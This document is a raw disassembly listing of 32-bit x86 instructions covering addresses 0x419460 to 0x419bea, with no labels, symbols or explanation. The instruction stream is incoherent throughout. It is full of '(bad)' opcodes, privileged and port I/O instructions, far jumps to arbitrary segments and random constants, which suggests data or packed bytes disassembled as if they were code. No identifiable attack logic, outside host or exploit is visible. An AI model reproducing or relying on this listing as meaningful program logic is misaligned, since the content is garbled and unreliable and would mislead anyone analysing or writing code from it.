  419460:	cmp    ch,BYTE PTR [esi+0x15]
  419463:	xor    cl,bl
  419465:	mov    edi,0xc20da835
  41946a:	addr16 (bad) 
  41946c:	enter  0x70f1,0x63
  419470:	mov    BYTE PTR [edx-0x6b],bh
  419473:	add    cl,ah
  419475:	in     al,0x9e
  419477:	sub    eax,0xf8175fc1
  41947c:	mov    edx,0x44143ada
  419481:	in     al,dx
  419482:	dec    eax
  419483:	ss mov eax,0x556762aa
  419489:	cmp    BYTE PTR [edi-0x73],cl
  41948c:	mov    ah,0xeb
  41948e:	inc    ebx
  41948f:	cmp    ch,ah
  419491:	sbb    eax,0xd2538585
  419496:	arpl   WORD PTR [edi],ax
  419498:	iret   
  419499:	inc    ebp
  41949a:	xchg   edi,eax
  41949b:	xor    DWORD PTR [edi],0x536af190
  4194a1:	pop    edi
  4194a2:	ss inc ecx
  4194a4:	and    al,0x3f
  4194a6:	inc    edi
  4194a7:	iret   
  4194a8:	iret   
  4194a9:	mov    dh,0x0
  4194ab:	xchg   ebx,eax
  4194ac:	inc    esp
  4194ad:	stos   DWORD PTR es:[edi],eax
  4194ae:	cmc    
  4194af:	inc    edi
  4194b0:	lods   al,BYTE PTR ds:[esi]
  4194b1:	cli    
  4194b2:	stos   BYTE PTR es:[edi],al
  4194b3:	and    DWORD PTR [ecx-0xc],0x81da3c96
  4194ba:	mov    edx,0xd7e8887e
  4194bf:	or     BYTE PTR [edx-0x2b24f7de],ah
  4194c5:	adc    BYTE PTR [esi],al
  4194c7:	jne    0x4194be
  4194c9:	fistp  WORD PTR [ebp+0x75]
  4194cc:	pop    esi
  4194cd:	clc    
  4194ce:	daa    
  4194cf:	rol    esp,cl
  4194d1:	repnz mov DWORD PTR [ebx],0x7f8fce19
  4194d8:	imul   eax,eax,0x51
  4194db:	add    eax,0xdee0f89a
  4194e0:	fsubr  QWORD PTR [ebx]
  4194e2:	(bad)  
  4194e3:	dec    edx
  4194e4:	scas   eax,DWORD PTR es:[edi]
  4194e5:	std    
  4194e6:	shl    BYTE PTR [edx+0x4bb755d5],0x90
  4194ed:	stos   BYTE PTR es:[edi],al
  4194ee:	xor    al,al
  4194f0:	mov    dl,0xe3
  4194f2:	add    bh,0xd7
  4194f5:	(bad)  
  4194f6:	push   ebp
  4194f7:	cmp    al,0xf9
  4194f9:	mov    al,ds:0xb18313ac
  4194fe:	dec    edx
  4194ff:	xlat   BYTE PTR ds:[ebx]
  419500:	fistp  WORD PTR [edi]
  419502:	add    al,0xd9
  419504:	neg    BYTE PTR [edx+0xe]
  419507:	mov    ah,BYTE PTR [ebp-0x6bc391c9]
  41950d:	daa    
  41950e:	adc    ah,dl
  419510:	das    
  419511:	std    
  419512:	mov    dh,0xa
  419514:	pop    ss
  419515:	xor    edx,DWORD PTR [edx]
  419517:	xlat   BYTE PTR ds:[ebx]
  419518:	cvttps2pi mm3,QWORD PTR [ecx+eax*8+0x4e]
  41951d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41951e:	cmp    DWORD PTR [edx],ecx
  419520:	and    esp,ebx
  419522:	cmp    dl,0x41
  419525:	std    
  419526:	mov    al,ds:0xbdc3a6cc
  41952b:	ds icebp 
  41952d:	push   0xffffffb7
  41952f:	xlat   BYTE PTR ds:[ebx]
  419530:	jmp    0xf5f5:0x93b7d188
  419537:	stc    
  419538:	(bad)  
  419539:	jmp    0xdf2a:0xbee14f57
  419540:	cmp    eax,0x20d0d376
  419545:	mov    cr5,ebp
  419548:	jp     0x419544
  41954a:	fdiv   DWORD PTR [eax]
  41954c:	ins    DWORD PTR es:[edi],dx
  41954d:	fidivr DWORD PTR [eax]
  41954f:	mov    edi,0xd0b6253a
  419554:	call   0xefcc596d
  419559:	fidiv  DWORD PTR [ecx+0x5b]
  41955c:	lds    esi,FWORD PTR [ebx-0x28c9b4b8]
  419562:	cmp    DWORD PTR [edi],esi
  419564:	retf   
  419565:	cmc    
  419566:	mov    dl,0xe
  419568:	lahf   
  419569:	sub    DWORD PTR [eax],0xffffffb2
  41956c:	xor    edi,edx
  41956e:	pop    ebx
  41956f:	pushf  
  419570:	fsub   DWORD PTR [edi+0x57]
  419573:	mov    ecx,0xe9c9e7aa
  419578:	loop   0x419532
  41957a:	outs   dx,DWORD PTR ds:[esi]
  41957b:	retf   0x8ba5
  41957e:	sbb    edi,DWORD PTR [edi]
  419580:	repz xor esp,DWORD PTR [esi]
  419583:	loopne 0x4195f8
  419585:	lds    esp,FWORD PTR [eax+0x32]
  419588:	cmp    eax,0xe7ea2890
  41958d:	inc    esi
  41958e:	inc    ebx
  41958f:	es pop ebp
  419591:	jns    0x4195da
  419593:	fstp   QWORD PTR [edi]
  419595:	out    dx,eax
  419596:	mov    edx,0x902eb085
  41959b:	pop    edx
  41959c:	not    BYTE PTR [esi-0x1b175691]
  4195a2:	pop    es
  4195a3:	xchg   ecx,eax
  4195a4:	and    bh,BYTE PTR [edi+0x77b2a6c1]
  4195aa:	and    edi,DWORD PTR [ecx]
  4195ac:	push   ecx
  4195ad:	outs   dx,BYTE PTR ds:[esi]
  4195ae:	(bad)  
  4195b0:	arpl   WORD PTR [edi],bp
  4195b2:	pusha  
  4195b3:	dec    esp
  4195b4:	push   0xffffffad
  4195b6:	xchg   edi,eax
  4195b7:	fdiv   QWORD PTR [edx+eax*8+0x73]
  4195bb:	(bad)  
  4195bc:	les    ebx,FWORD PTR [ecx-0x5a]
  4195bf:	imul   edx,esp,0x289531ea
  4195c5:	dec    ecx
  4195c6:	jl     0x4195d4
  4195c8:	imul   ebx,ebp,0x12cb84c0
  4195ce:	xlat   BYTE PTR ds:[ebx]
  4195cf:	les    ebx,FWORD PTR [edx+0x11bab9dd]
  4195d5:	inc    edx
  4195d6:	das    
  4195d7:	ins    DWORD PTR es:[edi],dx
  4195d8:	lea    ecx,[edi+0x5b]
  4195db:	ds jno 0x4195be
  4195de:	push   ecx
  4195df:	adc    esp,DWORD PTR [ecx]
  4195e1:	outs   dx,BYTE PTR ds:[esi]
  4195e2:	or     DWORD PTR [eax+0x1c494809],esi
  4195e8:	jmp    0xb1e5:0x25ed668a
  4195ef:	pop    ebp
  4195f0:	cli    
  4195f1:	popf   
  4195f2:	xor    esp,DWORD PTR [ebx+0xa]
  4195f5:	add    ebx,DWORD PTR [ebp-0x27babbd7]
  4195fb:	dec    esi
  4195fc:	pusha  
  4195fd:	popa   
  4195fe:	jb     0x41958e
  419600:	mov    dh,0xb2
  419602:	adc    dh,BYTE PTR [ebx-0x18]
  419605:	fbstp  TBYTE PTR [eax+ebx*2]
  419608:	pop    ebx
  419609:	outs   dx,BYTE PTR ds:[esi]
  41960a:	arpl   WORD PTR [edx+0x34],dx
  41960d:	in     eax,dx
  41960e:	xor    al,0xd
  419610:	xor    cl,BYTE PTR gs:[ebx-0x6d398693]
  419617:	ja     0x4195b0
  419619:	and    al,0xfb
  41961b:	pop    esi
  41961c:	retf   0x71c2
  41961f:	ret    0x3168
  419622:	dec    edi
  419623:	dec    eax
  419624:	mov    ecx,DWORD PTR [ecx+0x74]
  419627:	mov    ds:0x14ffa947,eax
  41962c:	cmp    edx,DWORD PTR [edi+0x11]
  41962f:	jnp    0x419600
  419631:	add    edi,DWORD PTR [esi+0x3f]
  419634:	out    0xe4,al
  419636:	mov    BYTE PTR [ebx+0x5ff4a3e4],0x82
  41963d:	jb     0x4196a2
  41963f:	push   es
  419640:	jno    0x41960c
  419642:	xor    ax,0x5cc6
  419646:	inc    ebp
  419647:	(bad)  
  419648:	in     al,0x2c
  41964a:	push   edx
  41964b:	xor    al,0x36
  41964d:	mov    bl,0x66
  41964f:	dec    ebx
  419650:	inc    edi
  419651:	xor    BYTE PTR [ebp+0x6d],dl
  419654:	add    DWORD PTR [eax-0x5c51b3eb],0xb379c852
  41965e:	into   
  41965f:	jmp    DWORD PTR [eax]
  419661:	repz imul edx
  419664:	(bad)  
  419665:	xor    eax,0x3f6030a9
  41966a:	xchg   edi,ecx
  41966c:	mov    ds:0x96936730,eax
  419671:	lods   eax,DWORD PTR ds:[esi]
  419672:	pop    esi
  419673:	aaa    
  419674:	aad    0x22
  419676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419677:	ins    BYTE PTR es:[edi],dx
  419678:	mov    al,ds:0x7dffa8cc
  41967d:	cmp    BYTE PTR [ebp-0x48],0xcc
  419681:	cs sbb al,0x46
  419684:	ret    
  419685:	or     BYTE PTR fs:[edx+ebp*1],cl
  419689:	push   0xffffffa0
  41968b:	or     al,0x2c
  41968d:	jno    0x419690
  41968f:	out    0x9d,al
  419691:	mov    esp,fs
  419693:	cwde   
  419694:	sub    BYTE PTR [edi-0x34],al
  419697:	push   eax
  419698:	mov    dh,0x20
  41969a:	xchg   ebp,eax
  41969b:	adc    eax,0xf7001d20
  4196a0:	bound  esi,QWORD PTR [ecx]
  4196a2:	xchg   edi,eax
  4196a3:	and    al,0x47
  4196a5:	mov    edi,0xc3e038ba
  4196aa:	inc    ebp
  4196ab:	sbb    dh,BYTE PTR [eax]
  4196ad:	cld    
  4196ae:	and    DWORD PTR [ebx-0x50],eax
  4196b1:	(bad)  
  4196b2:	repnz fild WORD PTR [edx+0x2b50d125]
  4196b9:	arpl   WORD PTR [esi+0x71],dx
  4196bc:	sub    eax,esp
  4196be:	or     BYTE PTR [edx],dh
  4196c0:	xchg   ebp,eax
  4196c1:	add    edx,DWORD PTR [edx-0x40]
  4196c4:	cmp    ecx,DWORD PTR [esi+0x40]
  4196c7:	push   0x235f1b9e
  4196cc:	pop    ebp
  4196cd:	xlat   BYTE PTR ds:[ebx]
  4196ce:	jmp    0x419658
  4196d0:	push   cs
  4196d1:	test   BYTE PTR [edi-0x56],0xb9
  4196d5:	xbegin 0x35ff17b3
  4196db:	in     eax,dx
  4196dc:	jno    0x419665
  4196de:	jmp    0xd62c6e26
  4196e3:	out    0x3,eax
  4196e5:	xchg   ebx,eax
  4196e6:	cmc    
  4196e7:	jle    0x419684
  4196e9:	das    
  4196ea:	rcl    BYTE PTR [ebp+0x45aa01b4],cl
  4196f0:	xor    dh,BYTE PTR ds:0xcc5847b6
  4196f6:	mov    eax,ds:0x7b4fabe2
  4196fb:	inc    ebx
  4196fc:	out    0xae,al
  4196fe:	popf   
  4196ff:	sub    al,0xff
  419701:	sbb    eax,0x83886f8e
  419706:	xor    al,0x45
  419708:	iret   
  419709:	test   BYTE PTR [eax+ecx*4-0x6ecdf4a9],0xbe
  419711:	es fs nop
  419714:	ret    
  419715:	retf   
  419716:	or     eax,0x13e86c04
  41971b:	(bad)  
  41971c:	mov    dl,0x8a
  41971e:	pop    ebp
  41971f:	clc    
  419720:	es punpcklwd mm4,mm1
  419724:	xchg   edx,eax
  419725:	mov    edx,ecx
  419727:	add    ebp,DWORD PTR [ecx]
  419729:	cmp    DWORD PTR [edx-0x66],esp
  41972c:	aad    0xa1
  41972e:	inc    esi
  41972f:	and    ebx,ecx
  419731:	xchg   esi,eax
  419732:	sbb    eax,0x6ad71c93
  419737:	fadd   DWORD PTR [edx+0x7db24de]
  41973d:	adc    al,0xc6
  41973f:	ds rcl dh,1
  419742:	xlat   BYTE PTR ds:[bx]
  419744:	cmp    DWORD PTR [eax-0x42],ebp
  419747:	cli    
  419748:	idiv   BYTE PTR [ebx+0x349a94bc]
  41974e:	lods   al,BYTE PTR ds:[esi]
  41974f:	xchg   al,bh
  419751:	mov    cl,0x5a
  419753:	xlat   BYTE PTR ds:[ebx]
  419754:	jne    0x4197d3
  419756:	lea    esi,[eax+ebp*8-0x34b22b3d]
  41975d:	sbb    ch,BYTE PTR [edi+edx*2+0x3d]
  419761:	push   0xffffffbf
  419763:	jl     0x419706
  419765:	adc    al,dl
  419767:	popf   
  419768:	xchg   ecx,eax
  419769:	js     0x4197cc
  41976b:	xchg   ebx,eax
  41976c:	das    
  41976d:	xor    eax,0xd18943cf
  419772:	mov    bh,0x83
  419774:	ja     0x419712
  419776:	pop    edx
  419777:	or     dl,BYTE PTR [esi+0x20]
  41977a:	aas    
  41977b:	and    esi,DWORD PTR [edi-0x5d]
  41977e:	xchg   ebp,eax
  41977f:	mov    ecx,0xa34ea391
  419784:	das    
  419785:	push   ecx
  419786:	retf   
  419787:	mov    al,bl
  419789:	dec    esp
  41978a:	sbb    ah,ah
  41978c:	cmc    
  41978d:	dec    ebp
  41978e:	jns    0x4197e4
  419790:	adc    al,0xc2
  419792:	sbb    BYTE PTR [ebp+0x13913d7f],bl
  419798:	or     BYTE PTR [ebp+0x40],0x58
  41979c:	mov    cl,0x3e
  41979e:	dec    esi
  41979f:	add    al,0x8f
  4197a1:	repz xlat BYTE PTR ds:[ebx]
  4197a3:	adc    ah,ah
  4197a5:	mov    esp,DWORD PTR [edx+0x33ab25cf]
  4197ab:	push   eax
  4197ac:	add    eax,DWORD PTR [edx]
  4197ae:	(bad)  
  4197b0:	xchg   esp,eax
  4197b1:	sbb    al,0x44
  4197b3:	add    al,0x3d
  4197b5:	data16 in al,dx
  4197b7:	stos   BYTE PTR es:[edi],al
  4197b8:	les    eax,FWORD PTR [ebx+0xf]
  4197bb:	cld    
  4197bc:	add    cl,0xc8
  4197bf:	adc    al,0x45
  4197c1:	and    BYTE PTR [eax+0x14],ah
  4197c4:	xor    BYTE PTR es:[eax+0x35],dh
  4197c8:	lods   al,BYTE PTR ds:[esi]
  4197c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197ca:	icebp  
  4197cb:	dec    ecx
  4197cc:	mov    ch,cl
  4197ce:	fidiv  WORD PTR [ecx]
  4197d0:	add    DWORD PTR [edx-0x2e0e988e],ecx
  4197d6:	add    esp,DWORD PTR [edx+0x302ce9c]
  4197dc:	xchg   edx,eax
  4197dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197de:	or     ch,ch
  4197e0:	maskmovq mm4,(bad)
  4197e1:	mul    DWORD PTR [ebx]
  4197e3:	sbb    bl,0x4a
  4197e6:	sar    cl,cl
  4197e8:	push   ecx
  4197e9:	jl     0x41982d
  4197eb:	ja     0x4197bd
  4197ed:	imul   esp,DWORD PTR [eax],0xffffffae
  4197f0:	sub    al,0xb5
  4197f2:	and    BYTE PTR [ecx],bh
  4197f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f5:	jmp    0x4197d9
  4197f7:	add    ecx,DWORD PTR [ebp+0x667e0e0a]
  4197fd:	sub    BYTE PTR [ebx+0x447170ba],bl
  419803:	jp     0x41980f
  419805:	ror    BYTE PTR [edx+0x342c5214],1
  41980b:	(bad)  
  41980c:	int3   
  41980d:	xor    DWORD PTR [ebx-0x26a475c9],edx
  419813:	leave  
  419814:	jle    0x4197ea
  419816:	mov    eax,0x71e195dc
  41981b:	cmp    BYTE PTR [esi],bl
  41981d:	or     al,0x68
  41981f:	cmp    BYTE PTR [esi-0x602bb1e2],dh
  419825:	push   0x32
  419827:	mov    bl,0x4
  419829:	xor    dl,BYTE PTR [esi+0x1]
  41982c:	shr    DWORD PTR [esi-0x48],cl
  41982f:	imul   ch
  419831:	cmp    eax,DWORD PTR [eax*8+0x6db38acd]
  419838:	xchg   esi,eax
  419839:	cld    
  41983a:	inc    ebp
  41983b:	and    al,0x5
  41983d:	pop    ss
  41983e:	pop    esi
  41983f:	xchg   edx,eax
  419840:	js     0x419828
  419842:	sahf   
  419843:	call   0x8b9c87a4
  419848:	mov    ecx,0x947a6d0d
  41984d:	jp     0x419891
  41984f:	jg     0x419819
  419851:	popf   
  419852:	jnp    0x41986a
  419854:	iret   
  419855:	dec    edx
  419856:	sbb    eax,0x23ec4d32
  41985b:	dec    ebx
  41985c:	push   edi
  41985d:	pop    ss
  41985e:	sbb    eax,0x764a357c
  419863:	idiv   BYTE PTR [esi-0x5e940753]
  419869:	mov    ebx,0xbdbb9654
  41986e:	lea    edi,[ecx-0x6db533b0]
  419874:	mov    ecx,0x6e9ac6a9
  419879:	jl     0x419891
  41987b:	or     DWORD PTR [ecx],ecx
  41987d:	and    DWORD PTR gs:[eax-0x31],ecx
  419881:	das    
  419882:	inc    edx
  419883:	or     eax,0x86547ca
  419888:	mov    al,ds:0xd5edf84e
  41988d:	mov    edi,0x44b692dd
  419892:	js     0x419884
  419894:	scas   al,BYTE PTR es:[edi]
  419895:	jg     0x419829
  419897:	add    DWORD PTR [ecx],edi
  419899:	push   ebp
  41989a:	es push eax
  41989c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41989d:	inc    ecx
  41989e:	daa    
  41989f:	and    eax,0xbac04f61
  4198a4:	nop
  4198a5:	adc    eax,0x57ad94ec
  4198aa:	pop    eax
  4198ab:	dec    ecx
  4198ac:	data16 jo 0x419836
  4198af:	rcr    DWORD PTR [edx-0x2da6edf4],cl
  4198b5:	jns    0x419850
  4198b7:	inc    ebp
  4198b8:	out    dx,eax
  4198b9:	inc    esp
  4198ba:	xor    BYTE PTR [esi],ah
  4198bc:	in     al,0xe6
  4198be:	in     eax,0xbf
  4198c0:	xor    DWORD PTR [edi],esp
  4198c2:	mov    esp,0x6a92b5a
  4198c7:	loopne 0x4198ae
  4198c9:	sbb    BYTE PTR [ebx+0x1e],bl
  4198cc:	xchg   ebx,eax
  4198cd:	jge    0x419890
  4198cf:	pop    edi
  4198d0:	jmp    0x41985f
  4198d2:	ja     0x419898
  4198d4:	xor    BYTE PTR [edi+0x30f96452],dh
  4198da:	pusha  
  4198db:	and    dl,BYTE PTR ds:0x7048a126
  4198e1:	sub    DWORD PTR [edi],ebp
  4198e3:	sti    
  4198e4:	ss pop ebp
  4198e6:	lahf   
  4198e7:	pop    esp
  4198e8:	pop    es
  4198e9:	mov    edx,edx
  4198eb:	xchg   esp,eax
  4198ec:	mov    eax,?
  4198ee:	icebp  
  4198ef:	pop    esp
  4198f0:	mul    BYTE PTR [ecx-0x6c]
  4198f3:	inc    edx
  4198f4:	jl     0x41996c
  4198f6:	aas    
  4198f7:	dec    DWORD PTR [ebp+0x2d6e9cef]
  4198fd:	xor    bl,BYTE PTR [edx-0x5c5df6c2]
  419903:	call   0xb9c27d57
  419908:	or     al,0xbf
  41990a:	in     al,dx
  41990b:	mov    al,ds:0x8fa7c740
  419910:	adc    ecx,DWORD PTR [edi-0x1e65825c]
  419916:	dec    esp
  419917:	and    esi,eax
  419919:	and    eax,0xa82bef93
  41991e:	fdivrp st(3),st
  419920:	dec    edx
  419921:	sbb    ebp,DWORD PTR [ebp+0x6f993faa]
  419927:	xchg   ebx,eax
  419928:	adc    ebp,DWORD PTR [esi+0x78]
  41992b:	pop    esi
  41992c:	out    dx,eax
  41992d:	mov    al,ds:0xb6c549ec
  419932:	mov    ebx,0x43deaca4
  419937:	jmp    0x570e:0x18c897f4
  41993e:	cmp    edi,edx
  419940:	mov    edi,0xc97ebc8d
  419945:	pop    es
  419946:	popa   
  419947:	les    ecx,FWORD PTR [ecx+0x58b2fa99]
  41994d:	jns    0x419961
  41994f:	dec    esp
  419950:	ret    
  419951:	mov    BYTE PTR ds:0xc27c8395,al
  419957:	cmc    
  419958:	add    eax,0xf142aea0
  41995d:	sbb    BYTE PTR [edx+0x40580a0b],dl
  419963:	push   DWORD PTR [edx-0x77]
  419966:	add    BYTE PTR [esi-0x28],0x48
  41996a:	daa    
  41996b:	mov    eax,ds:0x199ff26b
  419970:	push   edi
  419971:	out    dx,eax
  419972:	in     al,dx
  419973:	scas   eax,DWORD PTR es:[edi]
  419974:	mov    edx,0x78c5fab8
  419979:	inc    ecx
  41997a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41997b:	sbb    dh,BYTE PTR [edi+edi*8+0x32]
  41997f:	fstp   DWORD PTR [edi+ecx*1-0x194b844e]
  419986:	idiv   bl
  419988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419989:	sar    DWORD PTR [esi],1
  41998b:	mov    edi,0xdf216c2f
  419990:	and    dh,BYTE PTR [ebx+0x2d46d7e]
  419996:	pop    eax
  419997:	daa    
  419998:	mov    dh,0x24
  41999a:	jmp    0x419a17
  41999c:	sbb    al,0x8b
  41999e:	mov    al,0xeb
  4199a0:	or     eax,0xdcced5ef
  4199a5:	aam    0xf4
  4199a7:	daa    
  4199a8:	pop    esi
  4199a9:	adc    DWORD PTR [ebx+0x46],ebx
  4199ac:	not    DWORD PTR [ebp-0x11]
  4199af:	sub    eax,0xab620a72
  4199b4:	gs jo  0x419a2a
  4199b7:	scas   eax,DWORD PTR es:[edi]
  4199b8:	mov    cs,ebp
  4199ba:	sbb    esi,ebx
  4199bc:	ret    
  4199bd:	pop    esp
  4199be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199bf:	or     cl,BYTE PTR ds:0xf808cdc8
  4199c5:	fst    DWORD PTR [esi+0x26f773]
  4199cb:	mov    ds:0x8498b0d6,eax
  4199d0:	js     0x4199c9
  4199d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199d4:	dec    edi
  4199d5:	in     eax,dx
  4199d6:	arpl   WORD PTR [esi],cx
  4199d8:	lea    ecx,[edx]
  4199da:	dec    edi
  4199db:	fimul  WORD PTR [ecx]
  4199dd:	inc    eax
  4199de:	sbb    ah,dl
  4199e0:	or     eax,DWORD PTR [eax]
  4199e2:	sti    
  4199e3:	scas   eax,DWORD PTR es:[edi]
  4199e4:	xchg   bl,dl
  4199e6:	sbb    DWORD PTR [esp+edx*8-0x308c2beb],esi
  4199ed:	retf   
  4199ee:	inc    edi
  4199ef:	cld    
  4199f0:	inc    edi
  4199f1:	inc    ebp
  4199f2:	inc    esp
  4199f3:	mov    al,ds:0x2c9fe2be
  4199f8:	xchg   BYTE PTR [ebx-0x32f43447],dh
  4199fe:	(bad)  
  4199ff:	stc    
  419a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a01:	cdq    
  419a02:	adc    ch,BYTE PTR [eax]
  419a04:	adc    cl,BYTE PTR [ebx]
  419a06:	xchg   edi,eax
  419a07:	and    bh,BYTE PTR [esi+ecx*8-0x2c]
  419a0b:	sti    
  419a0c:	aas    
  419a0d:	lds    eax,FWORD PTR [eax-0x6e708a94]
  419a13:	retf   
  419a14:	data16 or al,0x82
  419a17:	and    bh,BYTE PTR [edx-0x6c34f948]
  419a1d:	js     0x419a92
  419a1f:	mov    ecx,0x10ba79e3
  419a24:	call   0x919e2a27
  419a29:	sub    DWORD PTR [ebx+edi*2-0x36e70005],ebx
  419a30:	dec    ebx
  419a31:	lock and ebp,ebx
  419a34:	and    DWORD PTR ds:0x993891bf,ebp
  419a3a:	ret    
  419a3b:	jg     0x419a56
  419a3d:	sub    ebp,ecx
  419a3f:	(bad)  
  419a41:	sub    DWORD PTR [eax+0x1c],ebx
  419a44:	push   0x17
  419a46:	js     0x4199ef
  419a48:	test   DWORD PTR [ebx+0x1b9c3008],0x1a470eb8
  419a52:	xor    al,0x57
  419a54:	and    eax,0xce98c089
  419a59:	(bad)  
  419a5a:	mov    edi,0xcd6729a3
  419a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a60:	lock jmp DWORD PTR [ecx-0x559d6d64]
  419a67:	dec    esp
  419a68:	dec    ebx
  419a69:	jmp    0x419ae4
  419a6b:	clc    
  419a6c:	mov    bh,0x6c
  419a6e:	stos   BYTE PTR es:[edi],al
  419a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a70:	(bad)  
  419a71:	rol    BYTE PTR [ebp-0x59],cl
  419a74:	mov    dh,0x45
  419a76:	and    DWORD PTR [esi],ecx
  419a78:	mov    ds:0xb06d383b,eax
  419a7d:	stos   DWORD PTR es:[edi],eax
  419a7e:	cmp    al,0x49
  419a80:	push   0x3daf93b5
  419a85:	inc    esp
  419a86:	mov    dh,0xa6
  419a88:	mov    ds:0x826fb7e3,al
  419a8d:	jl     0x419a56
  419a8f:	jbe    0x419a49
  419a91:	xchg   esp,eax
  419a92:	and    al,0xb1
  419a94:	and    esp,eax
  419a96:	js     0x419b02
  419a98:	out    0x5e,al
  419a9a:	ja     0x419a3d
  419a9c:	imul   edi,DWORD PTR [ebp-0x4337b34a],0x4a
  419aa3:	cli    
  419aa4:	jne    0x419b0e
  419aa6:	jmp    FWORD PTR ds:0xf979d539
  419aac:	or     dh,BYTE PTR [ebx+0x3758c952]
  419ab2:	xchg   ebx,eax
  419ab3:	pop    ebx
  419ab4:	mov    ch,0x71
  419ab6:	nop
  419ab7:	xor    dh,ah
  419ab9:	cwde   
  419aba:	pop    edi
  419abb:	pop    esp
  419abc:	xor    edi,esp
  419abe:	jb     0x419aee
  419ac0:	xchg   ecx,eax
  419ac1:	xchg   DWORD PTR ss:[eax+eax*1-0x7d46ac69],ebp
  419ac9:	repz enter 0xbf95,0x4
  419ace:	push   ss
  419acf:	add    al,0x48
  419ad1:	jns    0x419b36
  419ad3:	repnz xchg esp,eax
  419ad5:	aad    0x41
  419ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ad8:	inc    ebx
  419ad9:	ss add eax,0xe7b62f38
  419adf:	push   esp
  419ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ae1:	add    ecx,DWORD PTR [esi-0x63dad5ec]
  419ae7:	xchg   ebp,eax
  419ae8:	mov    dh,0xc5
  419aea:	jmp    0x419b3c
  419aec:	int    0x30
  419aee:	adc    BYTE PTR [ebx-0x42],ch
  419af1:	mov    dl,BYTE PTR [esi-0x14]
  419af4:	lock jo 0x419a7c
  419af7:	out    dx,al
  419af8:	ins    BYTE PTR es:[edi],dx
  419af9:	and    bl,BYTE PTR [ebx+0x46819663]
  419aff:	pop    ebx
  419b00:	addr16 xchg edx,eax
  419b02:	mov    ds:0xfecbc7a9,al
  419b07:	outs   dx,DWORD PTR ds:[esi]
  419b08:	rcr    ebp,0x35
  419b0b:	js     0x419b0c
  419b0d:	shr    DWORD PTR [ecx-0x6085bb5f],1
  419b13:	jle    0x419b22
  419b15:	shr    BYTE PTR [esi+0x76],cl
  419b18:	inc    ecx
  419b19:	xlat   BYTE PTR ds:[ebx]
  419b1a:	in     al,dx
  419b1b:	pusha  
  419b1c:	aaa    
  419b1d:	or     DWORD PTR [eax+0x4347a36c],esi
  419b23:	lds    esi,FWORD PTR [ecx+0x1b567273]
  419b29:	and    bh,ah
  419b2b:	in     eax,dx
  419b2c:	stc    
  419b2d:	out    0xde,al
  419b2f:	inc    ebx
  419b30:	cmp    esp,DWORD PTR [eax]
  419b32:	mov    ebp,0xf90d1345
  419b37:	xor    al,0x3a
  419b39:	retf   0xcc99
  419b3c:	push   edx
  419b3d:	and    BYTE PTR [ebx],bh
  419b3f:	retf   0x838
  419b42:	xchg   esi,eax
  419b43:	sub    DWORD PTR [edx+edx*8],edx
  419b46:	mov    ds:0xf089f0f7,eax
  419b4b:	sbb    eax,0x11161d5
  419b50:	dec    esp
  419b51:	inc    eax
  419b52:	ins    DWORD PTR es:[edi],dx
  419b53:	mov    bl,0x87
  419b55:	xchg   ebp,eax
  419b56:	bound  edi,QWORD PTR [esi+0xc660bc4]
  419b5c:	xchg   edx,eax
  419b5d:	fs mov cl,0x77
  419b60:	dec    edx
  419b61:	ss pop edx
  419b63:	ins    DWORD PTR es:[edi],dx
  419b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b65:	out    dx,eax
  419b66:	and    bl,BYTE PTR [ecx-0x3f]
  419b69:	sbb    ebp,edi
  419b6b:	nop
  419b6c:	and    ecx,DWORD PTR [edi*2-0x1994ac5f]
  419b73:	sti    
  419b74:	hlt    
  419b75:	scas   al,BYTE PTR es:[edi]
  419b76:	jp     0x419bc8
  419b78:	(bad)  
  419b79:	scas   eax,DWORD PTR es:[edi]
  419b7a:	daa    
  419b7b:	xchg   ebp,eax
  419b7c:	bound  eax,QWORD PTR [eax+0x7cf402b6]
  419b82:	popa   
  419b83:	sar    DWORD PTR cs:[edx+0x76],0x9e
  419b88:	sti    
  419b89:	lods   al,BYTE PTR ds:[esi]
  419b8a:	or     WORD PTR [eax-0x63a7752],dx
  419b91:	bound  edi,QWORD PTR [ecx-0x39]
  419b94:	ja     0x419b2b
  419b96:	icebp  
  419b97:	or     al,0x3c
  419b99:	pop    ds
  419b9a:	ins    BYTE PTR es:[edi],dx
  419b9b:	mov    esi,DWORD PTR [esi-0x58e47a00]
  419ba1:	push   es
  419ba2:	sbb    edx,DWORD PTR [eax-0x37]
  419ba5:	xchg   edx,eax
  419ba6:	push   eax
  419ba7:	jp     0x419bee
  419ba9:	das    
  419baa:	in     al,dx
  419bab:	fisttp QWORD PTR [edx]
  419bad:	jne    0x419b69
  419baf:	out    0x88,eax
  419bb1:	add    DWORD PTR [edx+0xb],0x67707731
  419bb8:	dec    edx
  419bb9:	cmp    ebp,ebp
  419bbb:	push   esi
  419bbc:	mov    ss,WORD PTR ds:0x48187d97
  419bc2:	pusha  
  419bc3:	and    bh,dl
  419bc5:	inc    ecx
  419bc6:	or     edi,DWORD PTR [ebx-0x72]
  419bc9:	fadd   st,st(7)
  419bcb:	pop    ebp
  419bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bcd:	sbb    DWORD PTR [edx],edx
  419bcf:	mov    bh,0x41
  419bd1:	mov    al,ds:0x85cab79d
  419bd6:	and    DWORD PTR [ebp+0x51d73dfa],ecx
  419bdc:	pushf  
  419bdd:	std    
  419bde:	mov    ebx,0x6a20b4c4
  419be3:	ret    
  419be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be5:	pop    es
  419be6:	ror    DWORD PTR [eax],1
  419be8:	aam    0x3f
  419bea:	jb     0x419c2f
